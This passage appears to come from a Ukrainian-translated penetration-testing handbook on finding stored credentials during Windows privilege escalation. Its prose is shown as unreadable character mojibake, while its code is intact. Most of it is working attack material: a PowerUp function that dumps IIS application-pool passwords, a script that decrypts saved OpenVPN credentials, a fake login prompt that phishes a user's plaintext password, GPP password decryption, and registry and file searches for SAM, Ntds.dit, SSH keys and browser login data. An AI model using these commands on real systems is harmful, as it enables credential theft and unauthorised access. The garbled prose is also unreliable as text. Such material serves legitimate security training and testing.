**–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤ –∑ AppCmd.exe –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É—Ç–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º —Ç–∞ –∑–∞–ø—É—Å–∫–∞—Ç–∏ –ø—ñ–¥ —Ä—ñ–≤–Ω–µ–º –≤–∏—Å–æ–∫–æ—ó —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ.**\
**AppCmd.exe** —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π —É –∫–∞—Ç–∞–ª–æ–∑—ñ `%systemroot%\system32\inetsrv\`.\
–Ø–∫—â–æ —Ü–µ–π —Ñ–∞–π–ª —ñ—Å–Ω—É—î, —Ç–æ –º–æ–∂–ª–∏–≤–æ, —â–æ –¥–µ—è–∫—ñ **–ø—ñ–¥–∫–∞–∑–∫–∏** –±—É–ª–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ —Ç–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω—ñ**.

–¶–µ–π –∫–æ–¥ –±—É–≤ –≤–∏—Ç—è–≥–Ω—É—Ç–∏–π –∑ [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —ñ—Å–Ω—É—î `C:\Windows\CCM\SCClient.exe`.\
–Ü–Ω—Å—Ç–∞–ª—è—Ç–æ—Ä–∏ **–∑–∞–ø—É—Å–∫–∞—é—Ç—å—Å—è –∑ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ SYSTEM**, –±–∞–≥–∞—Ç–æ –∑ –Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤—ñ –¥–æ **DLL Sideloading (–Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## –§–∞–π–ª–∏ —Ç–∞ –†–µ—î—Å—Ç—Ä (–û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ)

### –û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### –ö–ª—é—á—ñ —Ö–æ—Å—Ç–∞ SSH Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH –∫–ª—é—á—ñ –≤ —Ä–µ—î—Å—Ç—Ä—ñ

SSH –ø—Ä–∏–≤–∞—Ç–Ω—ñ –∫–ª—é—á—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –≤ —Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª—é—á–∞ —Ä–µ—î—Å—Ç—Ä—É `HKCU\Software\OpenSSH\Agent\Keys`, —Ç–æ–º—É –≤–∞–º —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —î —Ç–∞–º —â–æ—Å—å —Ü—ñ–∫–∞–≤–µ:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –±—É–¥—å-—è–∫–∏–π –∑–∞–ø–∏—Å —É —Ü—å–æ–º—É —à–ª—è—Ö—É, —Ü–µ, –π–º–æ–≤—ñ—Ä–Ω–æ, –±—É–¥–µ –∑–±–µ—Ä–µ–∂–µ–Ω–∏–π –∫–ª—é—á SSH. –í—ñ–Ω –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º, –∞–ª–µ –º–æ–∂–µ –±—É—Ç–∏ –ª–µ–≥–∫–æ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É —Ç—É—Ç: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

–Ø–∫—â–æ —Å–ª—É–∂–±–∞ `ssh-agent` –Ω–µ –∑–∞–ø—É—â–µ–Ω–∞ —ñ –≤–∏ —Ö–æ—á–µ—Ç–µ, —â–æ–± –≤–æ–Ω–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∑–∞–ø—É—Å–∫–∞–ª–∞—Å—è –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ, –≤–∏–∫–æ–Ω–∞–π—Ç–µ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
–°—Ö–æ–∂–µ, —â–æ —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –±—ñ–ª—å—à–µ –Ω–µ —î –¥—ñ–π—Å–Ω–æ—é. –Ø —Å–ø—Ä–æ–±—É–≤–∞–≤ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –¥–µ—è–∫—ñ ssh-–∫–ª—é—á—ñ, –¥–æ–¥–∞—Ç–∏ —ó—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `ssh-add` —Ç–∞ —É–≤—ñ–π—Ç–∏ —á–µ—Ä–µ–∑ ssh –Ω–∞ –º–∞—à–∏–Ω—É. –†–µ—î—Å—Ç—Ä HKCU\Software\OpenSSH\Agent\Keys –Ω–µ —ñ—Å–Ω—É—î, —ñ procmon –Ω–µ –≤–∏—è–≤–∏–≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `dpapi.dll` –ø—ñ–¥ —á–∞—Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∞—Å–∏–º–µ—Ç—Ä–∏—á–Ω–∏–º –∫–ª—é—á–µ–º.
{% endhint %}

### –ù–µ–æ—á—ñ–∫—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —à—É–∫–∞—Ç–∏ —Ü—ñ —Ñ–∞–π–ª–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **metasploit**: _post/windows/gather/enum\_unattend_

–ü—Ä–∏–∫–ª–∞–¥ –≤–º—ñ—Å—Ç—É:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### –†–µ–∑–µ—Ä–≤–Ω—ñ –∫–æ–ø—ñ—ó SAM —Ç–∞ SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### –•–º–∞—Ä–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

–®—É–∫–∞–π—Ç–µ —Ñ–∞–π–ª –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **SiteList.xml**

### –ö–µ—à–æ–≤–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å GPP

–†–∞–Ω—ñ—à–µ –±—É–ª–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è–ª–∞ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –ª–æ–∫–∞–ª—å–Ω–∏—Ö –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤ –Ω–∞ –≥—Ä—É–ø—É –º–∞—à–∏–Ω —á–µ—Ä–µ–∑ –ì—Ä—É–ø–æ–≤—É –ø–æ–ª—ñ—Ç–∏–∫—É (GPP). –û–¥–Ω–∞–∫ —Ü–µ–π –º–µ—Ç–æ–¥ –º–∞–≤ –∑–Ω–∞—á–Ω—ñ –Ω–µ–¥–æ–ª—ñ–∫–∏ –∑ —Ç–æ—á–∫–∏ –∑–æ—Ä—É –±–µ–∑–ø–µ–∫–∏. –ü–æ-–ø–µ—Ä—à–µ, –æ–±'—î–∫—Ç–∏ –≥—Ä—É–ø–æ–≤–æ—ó –ø–æ–ª—ñ—Ç–∏–∫–∏ (GPO), –∑–±–µ—Ä–µ–∂–µ–Ω—ñ —É –≤–∏–≥–ª—è–¥—ñ —Ñ–∞–π–ª—ñ–≤ XML –≤ SYSVOL, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –±—É–¥—å-—è–∫–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ –¥–æ–º–µ–Ω—É. –ü–æ-–¥—Ä—É–≥–µ, –ø–∞—Ä–æ–ª—ñ –≤ —Ü–∏—Ö GPP, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é AES256 –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º –ø—É–±–ª—ñ—á–Ω–æ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤–∞–Ω–æ–≥–æ –∫–ª—é—á–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, –º–æ–∂—É—Ç—å –±—É—Ç–∏ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –±—É–¥—å-—è–∫–∏–º –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º. –¶–µ —Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–µ—Ä–π–æ–∑–Ω–∏–π —Ä–∏–∑–∏–∫, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø—ñ–¥–≤–∏—â–µ–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó.

–î–ª—è –∑–º–µ–Ω—à–µ–Ω–Ω—è —Ü—å–æ–≥–æ —Ä–∏–∑–∏–∫—É –±—É–ª–∞ —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –¥–ª—è –ø–æ—à—É–∫—É –ª–æ–∫–∞–ª—å–Ω–æ –∫–µ—à–æ–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ GPP, —â–æ –º—ñ—Å—Ç—è—Ç—å –ø–æ–ª–µ "cpassword", —è–∫–µ –Ω–µ —î –ø–æ—Ä–æ–∂–Ω—ñ–º. –ü—ñ—Å–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —Ç–∞–∫–æ–≥–æ —Ñ–∞–π–ª—É —Ñ—É–Ω–∫—Ü—ñ—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É—î –ø–∞—Ä–æ–ª—å —ñ –ø–æ–≤–µ—Ä—Ç–∞—î —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–π –æ–±'—î–∫—Ç PowerShell. –¶–µ–π –æ–±'—î–∫—Ç –º—ñ—Å—Ç–∏—Ç—å –≤—ñ–¥–æ–º–æ—Å—Ç—ñ –ø—Ä–æ GPP —Ç–∞ –º—ñ—Å—Ü–µ–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—É, —â–æ –¥–æ–ø–æ–º–∞–≥–∞—î –≤ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ —É—Å—É–Ω–µ–Ω–Ω—ñ —Ü—ñ—î—ó —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –±–µ–∑–ø–µ–∫–∏.

–®—É–∫–∞–π—Ç–µ —Ü—ñ —Ñ–∞–π–ª–∏ –≤ `C:\ProgramData\Microsoft\Group Policy\history` –∞–±–æ –≤ _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (–¥–æ W Vista)_:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**–î–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è crackmapexec –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### –ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –≤–µ–±-—Å–∞–π—Ç—É IIS
```powershell
Get-Childitem ‚ÄìPath C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem ‚ÄìPath C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem ‚ÄìPath C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
–ü—Ä–∏–∫–ª–∞–¥ web.config –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### –û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### –õ–æ–≥–∏
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem ‚ÄìPath C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### –ó–∞–ø–∏—Ç–∞–π—Ç–µ –ø—Ä–æ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ

–í–∏ –∑–∞–≤–∂–¥–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–ø–∏—Ç–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–≤–µ—Å—Ç–∏ —Å–≤–æ—ó –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∞–±–æ –Ω–∞–≤—ñ—Ç—å –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, —è–∫—â–æ –≤–∏ –≤–≤–∞–∂–∞—î—Ç–µ, —â–æ –≤—ñ–Ω –º–æ–∂–µ —ó—Ö –∑–Ω–∞—Ç–∏ (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–ø—Ä—è–º–µ –∑–∞–ø–∏—Ç–∞–Ω–Ω—è** –∫–ª—ñ—î–Ω—Ç–∞ –ø—Ä–æ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** —î –¥—É–∂–µ **—Ä–∏–∑–∏–∫–æ–≤–∞–Ω–∏–º**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **–ú–æ–∂–ª–∏–≤—ñ —ñ–º–µ–Ω–∞ —Ñ–∞–π–ª—ñ–≤, —â–æ –º—ñ—Å—Ç—è—Ç—å –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**

–í—ñ–¥–æ–º—ñ —Ñ–∞–π–ª–∏, —è–∫—ñ –∫–æ–ª–∏—Å—å –º—ñ—Å—Ç–∏–ª–∏ **–ø–∞—Ä–æ–ª—ñ** —É **—á–∏—Å—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ** –∞–±–æ —É **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
–ü–æ—à—É–∫ —É—Å—ñ—Ö –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem ‚ÄìPath C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### –û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤ –∫–æ—à–∏–∫—É

–í–∞–º —Ç–∞–∫–æ–∂ —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –∫–æ—à–∏–∫, —â–æ–± –∑–Ω–∞–π—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ.

–î–ª—è **–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤**, –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö –¥–µ–∫—ñ–ª—å–∫–æ–º–∞ –ø—Ä–æ–≥—Ä–∞–º–∞–º–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### –£ —Ä–µ—î—Å—Ç—Ä—ñ

**–Ü–Ω—à—ñ –º–æ–∂–ª–∏–≤—ñ –∫–ª—é—á—ñ —Ä–µ—î—Å—Ç—Ä—É –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**–í–∏–¥–æ–±—É—Ç—Ç—è –∫–ª—é—á—ñ–≤ openssh –∑ —Ä–µ—î—Å—Ç—Ä—É.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### –Ü—Å—Ç–æ—Ä—ñ—è –±—Ä–∞—É–∑–µ—Ä—ñ–≤

–í–∞–º —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –ø–∞—Ä–æ–ª—ñ –∑ **Chrome –∞–±–æ Firefox**.\
–¢–∞–∫–æ–∂ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —ñ—Å—Ç–æ—Ä—ñ—é, –∑–∞–∫–ª–∞–¥–∫–∏ —Ç–∞ —É–ª—é–±–ª–µ–Ω—ñ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏ –±—Ä–∞—É–∑–µ—Ä—ñ–≤, –º–æ–∂–ª–∏–≤–æ, —Ç–∞–º –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –¥–µ—è–∫—ñ **–ø–∞—Ä–æ–ª—ñ**.

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –≤–∏–¥–æ–±—É—Ç–∫—É –ø–∞—Ä–æ–ª—ñ–≤ –∑ –±—Ä–∞—É–∑–µ—Ä—ñ–≤:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **–ü–µ—Ä–µ–∑–∞–ø–∏—Å COM DLL**

